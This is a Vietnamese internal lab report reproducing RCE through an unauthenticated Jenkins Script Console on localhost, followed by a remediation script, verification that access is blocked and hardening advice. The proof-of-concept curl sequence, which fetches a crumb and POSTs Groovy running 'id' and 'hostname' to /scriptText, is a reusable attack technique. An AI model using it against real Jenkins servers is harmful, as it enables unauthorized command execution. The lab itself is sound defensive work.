# Lab 3.1 — Jenkins Script Console mở do cấu hình phân quyền sai

**Người phụ trách:** Đỗ Thảo Dương (báo cáo gốc) — tái hiện lại bởi Lê Đạt ngày 12/11/2026.
**Loại:** Security Misconfiguration (OWASP) → RCE tương đương. **Không gắn CVE cụ thể** — đây là lỗi cấu hình, không phải lỗi phần mềm Jenkins LTS.

> ⚠️ Lab nội bộ, chỉ bind `127.0.0.1`. Lệnh thực thi chỉ là PoC vô hại (`id`, `hostname`).
> Không khai thác sâu, không nhắm hệ thống bên thứ ba.

## 1. Tóm tắt
Jenkins cung cấp **Script Console** (`/script`) chạy mã Groovy trong ngữ cảnh tiến trình
Jenkins — tương đương quyền thực thi lệnh trên máy chủ. Khi cài đặt **bỏ qua setup wizard**
mà không chủ động bật Authorization/Security Realm, Jenkins giữ `useSecurity=false`: không có
xác thực, không có phân quyền, mọi người (kể cả ẩn danh) có toàn quyền — bao gồm Script Console.

## 2. Dựng lab (cấu hình KHÔNG an toàn)
```bash
docker compose up -d
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:8080/login   # 200 khi sẵn sàng
```

## 3. Chứng minh (PoC vô hại) — đã thực hiện thật, log tại `evidence/`
```bash
# Script Console mở cho người chưa đăng nhập
curl -s -o /dev/null -w "%{http_code}\n" http://127.0.0.1:8080/script   # -> 200

# Xác nhận không có security nào được bật
curl -s http://127.0.0.1:8080/api/json | grep useSecurity    # -> "useSecurity":false

# Chạy Groovy vô hại qua /scriptText (cần lấy CSRF crumb + cookie trước)
CRUMB=$(curl -s -c cookies.txt -b cookies.txt http://127.0.0.1:8080/crumbIssuer/api/json)
FIELD=$(echo "$CRUMB" | python3 -c "import sys,json;print(json.load(sys.stdin)['crumbRequestField'])")
VAL=$(echo "$CRUMB"   | python3 -c "import sys,json;print(json.load(sys.stdin)['crumb'])")
curl -s -c cookies.txt -b cookies.txt -H "$FIELD: $VAL" \
  --data-urlencode 'script=println "id".execute().text; println "hostname".execute().text' \
  http://127.0.0.1:8080/scriptText
```
**Kết quả quan sát (thật, 12/11/2026):** `uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)`
và hostname của container — thực thi thành công dù **không đăng nhập**. Ảnh:
`evidence/01-script-console-anon-before.png`, `evidence/02-groovy-exec-anon-output.png`.

## 4. Nguyên nhân gốc
Jenkins cài thủ công (bỏ qua setup wizard) không bắt buộc cấu hình phân quyền. `api/json`
xác nhận `useSecurity:false` ngay sau khi khởi động — mọi chức năng mạnh (gồm Script Console)
mở công khai cho tới khi admin chủ động bật Security.

## 5. Vá & chứng minh khắc phục — đã thực hiện thật
Áp cấu hình qua Script Console (một lần, với quyền đang mở) để bật Security Realm +
Authorization Strategy:
```groovy
def j = Jenkins.get()
def realm = new HudsonPrivateSecurityRealm(false)
realm.createAccount("lab31admin", "<mật khẩu lab>")
j.setSecurityRealm(realm)
def strategy = new FullControlOnceLoggedInAuthorizationStrategy()
strategy.setAllowAnonymousRead(false)
j.setAuthorizationStrategy(strategy)
j.save()
```
**Kiểm chứng lại bằng phiên ẩn danh hoàn toàn mới (không cookie cũ):**
- `GET /script` → **403**, redirect `/login?from=%2Fscript`
- `POST /scriptText` (ẩn danh) → **403**
- `GET /api/json` (ẩn danh) → **403**

⇒ Script Console và toàn bộ API không còn truy cập được khi chưa đăng nhập. Ảnh:
`evidence/03-script-console-anon-after-fix.png`, `evidence/04-after-fix-summary.png`.

### Biện pháp phòng chống
- Luôn bật Authorization Strategy ngay sau cài đặt; giới hạn quyền Script Console cho admin.
- Đặt Jenkins sau reverse proxy có xác thực tập trung (SSO/LDAP), không public.
- Bật Audit Trail để ghi log truy cập chức năng quản trị nhạy cảm.
- Kiểm tra `api/json` → `useSecurity` ngay sau khi triển khai bất kỳ Jenkins mới nào.

### Hệ thống tương tự
Mọi nền tảng có console "chạy lệnh/script debug" (CI/CD, CMS) đều nguy hiểm nếu không kiểm soát
phân quyền ngay từ khi triển khai.

## 6. Dọn dẹp
```bash
docker compose down -v
```
